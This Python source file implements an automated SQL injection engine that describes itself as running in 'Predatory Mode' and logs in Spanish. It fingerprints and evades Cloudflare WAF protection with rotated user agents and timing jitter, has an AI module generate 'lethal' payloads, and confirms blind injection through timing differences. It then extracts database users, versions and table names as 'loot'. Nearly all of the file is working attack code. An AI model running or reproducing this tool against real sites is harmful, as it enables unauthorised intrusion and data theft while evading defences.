
import asyncio
import random
import time
import statistics
import re
import os
from typing import List, Dict, Optional, Tuple, Callable, Any
from dataclasses import dataclass
from backend.core.smart_cache import get_shared_smart_cache

@dataclass
class AIIEResult:
    vulnerable: bool
    vector: str
    evidence: str
    payload: str
    confidence: float
    loot: Dict[str, str] = None # Added for exfiltrated data

class CerberusAIIE:
    """
    Advanced Intelligent Injection Engine (2026 Edition).
    Specialized in evading signatures and detecting subtle database behavioral changes.
    """
    
    def __init__(self, broadcast: Callable):
        self.broadcast = broadcast
        # Initialize SmartCache for AI persistent learning
        cache_db_path = os.environ.get("CERBERUS_SMART_CACHE_DB", "backend/data/smart_cache.sqlite3")
        self.smart_cache = get_shared_smart_cache(db_path=cache_db_path)
        
        self.ua_pool = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
        ]

    def _mutate_ast_logical(self, condition: bool) -> str:
        """Generates logically equivalent SQL snippets that vary in AST structure."""
        if condition: # TRUE patterns
            patterns = [
                "(SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1",
                "ABS(1)=1",
                "LENGTH('A')=1",
                "(SELECT 1)>(SELECT 0)",
                "BIT_COUNT(1)=1",
                "123=123",
                "STRCMP('a','a')=0"
            ]
        else: # FALSE patterns
            patterns = [
                "(SELECT CASE WHEN (1=2) THEN 1 ELSE 0 END)=1",
                "ABS(0)=1",
                "LENGTH('')=1",
                "(SELECT 0)>(SELECT 1)",
                "BIT_COUNT(0)=1",
                "123=124",
                "STRCMP('a','b')=0"
            ]
        return random.choice(patterns)

    async def _measure_response(self, client, url: str, params: Dict, headers: Dict) -> float:
        start = time.perf_counter()
        try:
            await client.get(url, params=params, headers=headers)
            return time.perf_counter() - start
        except Exception:
            return 99.0  # Defensive timeout sentinel for failed requests

    async def detect_sqli(self, url: str, base_params: Dict, risk_level: int = 1, client: Any = None) -> AIIEResult:
        """
        Detection & Weaponization using Cortex AI and Statistical Analysis.
        Now adapts to WAF signals (Cloudflare) in real-time.
        """
        try:
            import httpx
            from backend.core.cortex_ai import generate_lethal_payload
        except ImportError:
            return AIIEResult(False, "AIIE", "Missing dependencies (httpx/cortex)", "", 0.0)

        await self.broadcast("CERBERUS_PRO", "INFO", f"AIIE (Predatory Mode): Iniciando análisis ofensivo en {url}", {})
        
        waf_signals = []
        
        # v5.0: Stealth Layer - Use global anonymized client if provided
        managed_client = False
        if client is None:
            client = httpx.AsyncClient(timeout=10.0, verify=False)
            managed_client = True

        try:
            # 1. Establish Baseline (Statistical anchor)
            baselines = []
            for _ in range(3): 
                ua = random.choice(self.ua_pool)
                headers = {"User-Agent": ua, "Referer": url}
                resp = await client.get(url, params=base_params, headers=headers)
                baselines.append(resp.elapsed.total_seconds())
                
                # Real-time WAF Fingerprinting
                h = resp.headers
                if ("cf-ray" in h) or ("cloudflare" in h.get("server", "").lower()):
                    if "waf_cloudflare" not in waf_signals:
                        waf_signals.append("waf_cloudflare")
                        await self.broadcast("CERBERUS_PRO", "WARNING", "AIIE: Cloudflare detectado. Ajustando táctica a modo Sigilo L5.", {})

            avg_base = statistics.mean(baselines)
            std_base = statistics.stdev(baselines) if len(baselines) > 1 else 0.01
            await self.broadcast("CERBERUS_PRO", "DEBUG", f"AIIE: Baseline establecido ({avg_base:.4f}s)", {})

            # 2. AI Weaponization Loop
            tech_stack = {
                "url": url,
                "platform": "PHP/Linux" if ".php" in url.lower() else "Unknown",
                "environment": "Production" if "www." in url.lower() else "Testing"
            }

            # ── Collective Intelligence (Phase 2) ──
            # Check if a specialized native engine (UNION, INLINE, etc.) already found a breach.
            # If so, the AI doesn't need to "guess" anymore; it can proceed to weaponize the find.
            try:
                native_intel = await self.smart_cache.get_cached_strategy({
                    "namespace": "native_success_v1",
                    "target": url
                })
                if native_intel:
                    await self.broadcast("CORTEX", "SUCCESS", f"AIIE (Collective Intelligence): Confirmando brecha detectada por motor nativo ({native_intel.get('vector_type', 'Nativo')}). Procediendo a exfiltración directa.", {})
                    if risk_level >= 2:
                        loot = await self.extract_data(client, url, base_params, tech_stack, waf_signals=waf_signals)
                        return AIIEResult(
                            vulnerable=True,
                            vector=f"NATIVE_AIDED_{native_intel.get('vector_type', 'SQL')}",
                            evidence=f"Vulnerabilidad confirmada por motor nativo y validada por IA. {native_intel.get('evidence', '')}",
                            payload="N/A (Native Success)",
                            confidence=1.0,
                            loot=loot
                        )
            except Exception as e_intel:
                import logging
                logging.getLogger("cerberus.aiie").error(f"Error checking collective intelligence: {e_intel}")

            # context for SmartCache learning
            cache_context = {
                "namespace": "ai_lethal_payloads_v1",
                "platform": tech_stack["platform"],
                "waf": ",".join(sorted(waf_signals)) if waf_signals else "none",
                "risk_level": risk_level
            }
            
            for i in range(3):
                # Trigger AI to generate a LETHAL payload based on context + WAF
                await self.broadcast("CORTEX", "INFO", f"Generando carga letal adaptativa (Intento {i+1})...", {})
                
                # Fast Path: Check memory/cache before hitting AI
                cached_ai_data = await self.smart_cache.get_cached_strategy(cache_context)
                if cached_ai_data:
                    await self.broadcast("CORTEX", "INFO", "AIIE (Cache Hit): Recuperando táctica letal aprendida de la memoria persistente.", {})
                    ai_data = cached_ai_data
                else:
                    ai_data = await generate_lethal_payload(
                        target_url=url,
                        tech_stack=tech_stack,
                        risk_level=risk_level,
                        waf_signals=waf_signals
                    )
                
                payload = ai_data["payload"]
                reasoning = ai_data["reasoning"]
                
                await self.broadcast("CERBERUS_PRO", "INFO", f"AIIE: Desplegando táctica (Bypass active): {reasoning}", {})

                test_params = base_params.copy()
                first_key = list(test_params.keys())[0] if test_params else "id"
                test_params[first_key] = f"{test_params.get(first_key, '1')}{payload}"
                
                # Adaptive Jitter & Referer for WAF bypass
                jitter = random.uniform(3.0, 8.0) if "waf_cloudflare" in waf_signals else random.uniform(0.5, 2.0)
                ua = random.choice(self.ua_pool)
                headers = {"User-Agent": ua, "Referer": url}
                
                await asyncio.sleep(jitter)

                start_test = time.perf_counter()
                resp = None
                try:
                    resp = await client.get(url, params=test_params, headers=headers)
                    delay = time.perf_counter() - start_test
                except Exception:
                    delay = 99.0

                z_score = (delay - avg_base) / (std_base or 0.001)
                
                await self.broadcast("CERBERUS_PRO", "DEBUG", f"AIIE: Reacción detectada (Latency: {delay:.2f}s, Z-Score: {z_score:.2f})", {})

                # Block detection
                if resp is not None and resp.status_code == 403:
                    await self.broadcast("CERBERUS_PRO", "ERROR", "AIIE: Firewall detectado (403). Re-calculando...", {})
                    await self.smart_cache.update_feedback(cache_context, ai_data, success=False)
                    continue

                # hit detection candidate
                high_confidence_ai = ai_data.get("is_lethal", False) and ai_data.get("confidence", 0) > 0.7
                hit_threshold = 5.0 if high_confidence_ai else 12.0 # Much stricter if AI failed or is low confidence
                
                if z_score > hit_threshold or (delay > avg_base + 3.0):
                    await self.broadcast("CERBERUS_PRO", "INFO", "AIIE: Posible brecha detectada. Iniciando verificación diferencial (TRUE vs FALSE)...", {})
                    
                    # VERIFICATION: Test with a logical FALSE to see if latency drops
                    false_payload = self._mutate_ast_logical(False)
                    false_params = base_params.copy()
                    false_params[first_key] = f"{false_params.get(first_key, '1')}' AND {false_payload} --"
                    
                    start_false = time.perf_counter()
                    try:
                        await client.get(url, params=false_params, headers={"User-Agent": random.choice(self.ua_pool)})
                        delay_false = time.perf_counter() - start_false
                    except Exception:
                        delay_false = 99.0
                    
                    # If FALSE payload is ALSO slow, it's just network noise or WAF blanket throttling
                    if delay_false > (avg_base + 1.5):
                        await self.broadcast("CERBERUS_PRO", "WARNING", f"AIIE: Verificación fallida (Ruido de fondo detected). Latencia en FALSE: {delay_false:.2f}s", {})
                        continue

                    # Confirmed: TRUE is slow, FALSE is fast
                    await self.broadcast("CERBERUS_PRO", "SUCCESS", f"AIIE: Objetivo VULNERABLE confirmado vía análisis diferencial ({reasoning})", {})
                    
                    # AI Persistent Learning: Save successful payload context
                    await self.smart_cache.update_feedback(cache_context, ai_data, success=True)
                    
                    # 3. Extraction Phase
                    extracted_loot = {}
                    if risk_level >= 2:
                        await self.broadcast("CERBERUS_PRO", "INFO", "AIIE: Iniciando fase de exfiltración sigilosa...", {})
                        extracted_loot = await self.extract_data(client, url, base_params, tech_stack, waf_signals=waf_signals)
                    
                    return AIIEResult(
                        vulnerable=True,
                        vector="PREDATORY_AI",
                        evidence=f"Confirmado por IA con Z-Score {z_score:.2f} y Verificación Diferencial. Bypass: {reasoning}",
                        payload=payload,
                        confidence=ai_data.get("confidence", 0.5),
                        loot=extracted_loot
                    )
                
                await asyncio.sleep(jitter)
        finally:
            if managed_client:
                await client.aclose()

        return AIIEResult(False, "AIIE", "No se detectaron brechas letales tras 3 ciclos de IA (WAF Active).", "", 0.0)

    async def extract_data(self, client, url: str, base_params: Dict, tech_stack: Dict, waf_signals: List[str] = None) -> Dict[str, str]:
        """
        AI-driven intelligent extraction loop.
        Reads HTTP responses and parses for SQL data markers (in-band extraction).
        Falls back to differential analysis if direct markers are not found.
        """
        from backend.core.cortex_ai import generate_extraction_payload
        import logging
        logger = logging.getLogger("cerberus.aiie.extraction")
        loot = {}
        
        # 1. Capture a BASELINE response (no injection) for differential comparison
        await self.broadcast("CERBERUS_PRO", "INFO", "AIIE: Capturando baseline para análisis diferencial de extracción...", {})
        baseline_body = ""
        try:
            baseline_resp = await client.get(url, params=base_params, headers={"User-Agent": random.choice(self.ua_pool)})
            baseline_body = baseline_resp.text or ""
        except Exception as e:
            logger.warning(f"Baseline capture failed: {e}")

        # 2. INTELLIGENT EXTRACTION (All targets attempted)
        targets = [
            {"label": "db_identity", "query": "current_user() + ' | ' + database()", "description": "Usuario y Base de Datos"},
            {"label": "db_version", "query": "@@version", "description": "Versión del Motor DB"},
            {"label": "schema_tables", "query": "table_name FROM information_schema.tables LIMIT 10", "description": "Tablas del Esquema"},
        ]
        
        for target_info in targets:
            target = target_info["query"]
            label = target_info["label"]
            description = target_info["description"]
            try:
                await self.broadcast("CORTEX", "INFO", f"Extrayendo: {description}...", {})
                
                # Generate extraction payload via AI
                ai_data = await generate_extraction_payload(url, tech_stack, extraction_target=target, waf_signals=waf_signals)
                
                payload = ai_data.get("payload", f"' UNION SELECT {target} --")
                reasoning = ai_data.get("reasoning", "Extracción directa")
                
                await self.broadcast("CERBERUS_PRO", "INFO", f"AIIE: Extracción [{label}]: {reasoning}", {})

                test_params = base_params.copy()
                first_key = list(test_params.keys())[0] if test_params else "id"
                test_params[first_key] = f"{test_params.get(first_key, '1')}{payload}"
                
                # Stealth delay
                await asyncio.sleep(random.uniform(2.0, 5.0))
                
                # ACTUALLY READ THE RESPONSE
                resp = await client.get(url, params=test_params, headers={"User-Agent": random.choice(self.ua_pool)})
                resp_body = resp.text or ""
                
                # 3. PARSE RESPONSE for extracted data
                extracted_value = self._parse_extraction_response(resp_body, baseline_body, label)
                
                if extracted_value:
                    loot[label] = extracted_value
                    await self.broadcast("CERBERUS_PRO", "SUCCESS", f"AIIE: [{description}] → {extracted_value[:200]}", {})
                else:
                    # Differential: check if response changed significantly from baseline
                    diff_data = self._differential_extract(resp_body, baseline_body)
                    if diff_data:
                        loot[label] = diff_data
                        await self.broadcast("CERBERUS_PRO", "SUCCESS", f"AIIE: [{description}] (Diferencial) → {diff_data[:200]}", {})
                    else:
                        await self.broadcast("CERBERUS_PRO", "WARNING", f"AIIE: [{description}] sin datos extraíbles (WAF o respuesta limpia).", {})
                
            except Exception as e:
                logger.error(f"Intelligent extraction failed for {label}: {e}")
                
        return loot

    def _parse_extraction_response(self, resp_body: str, baseline_body: str, label: str) -> Optional[str]:
        """
        Parse HTTP response body for common SQL extraction markers.
        Looks for data that appears in the response but NOT in the baseline.
        """
        if not resp_body:
            return None
        
        # Find content that exists in response but NOT in baseline (the "leak")
        new_content = ""
        if baseline_body:
            # Simple line-based diff: find lines unique to the response
            baseline_lines = set(baseline_body.splitlines())
            resp_lines = resp_body.splitlines()
            new_lines = [line.strip() for line in resp_lines if line.strip() and line not in baseline_lines]
            new_content = "\n".join(new_lines)
        else:
            new_content = resp_body

        if not new_content:
            return None

        # Pattern matching for common SQL output
        patterns = {
            "db_identity": [
                re.compile(r"(\w+@\w+)", re.I),                          # user@host
                re.compile(r"current_user[:\s]*['\"]?(\S+)", re.I),       # current_user: root
                re.compile(r"database[:\s]*['\"]?(\w+)", re.I),           # database: mydb
            ],
            "db_version": [
                re.compile(r"(\d+\.\d+\.\d+[-\w]*)", re.I),              # 8.0.32-mysql
                re.compile(r"(MySQL|MariaDB|PostgreSQL|MSSQL|Oracle|SQLite)[\s/]*(\d[\d.]+)", re.I),
            ],
            "schema_tables": [
                re.compile(r"((?:users?|admin|config|sessions?|accounts?|passwords?|credentials?)\w*)", re.I),
            ],
        }
        
        target_patterns = patterns.get(label, [])
        matches = []
        for pattern in target_patterns:
            found = pattern.findall(new_content)
            if found:
                for m in found:
                    val = m if isinstance(m, str) else " ".join(m)
                    val = val.strip()
                    if val and len(val) > 1 and val not in matches:
                        matches.append(val)
        
        if matches:
            return " | ".join(matches[:10])
        
        # If no pattern matched but there IS new content, return raw snippet
        clean = new_content.strip()
        if clean and len(clean) > 3 and len(clean) < 5000:
            # Filter out HTML noise
            if not any(tag in clean.lower() for tag in ["<html", "<head", "<script", "<!doctype"]):
                return clean[:500]
        
        return None

    def _differential_extract(self, resp_body: str, baseline_body: str) -> Optional[str]:
        """
        Compare response with baseline to find data leaks via size/content difference.
        """
        if not resp_body or not baseline_body:
            return None
        
        resp_len = len(resp_body)
        base_len = len(baseline_body)
        
        # If response is significantly larger (>10% more), there might be leaked data
        if base_len > 0 and (resp_len - base_len) / base_len > 0.10:
            # Find the extra content
            # Simple approach: find the longest substring in resp that's NOT in baseline
            resp_lines = resp_body.splitlines()
            base_set = set(baseline_body.splitlines())
            extra = [line.strip() for line in resp_lines if line.strip() and line not in base_set]
            if extra:
                result = "\n".join(extra[:20])
                if len(result) > 3 and not result.startswith("<"):
                    return result[:500]
        
        return None


    async def run_full_scan(self, target: str, config: Dict):
        """Unified entry point for Omni integration."""
        params = config.get("params", {"id": "1"})
        risk = int(config.get("risk", 1))
        res = await self.detect_sqli(target, params, risk_level=risk)
        return res

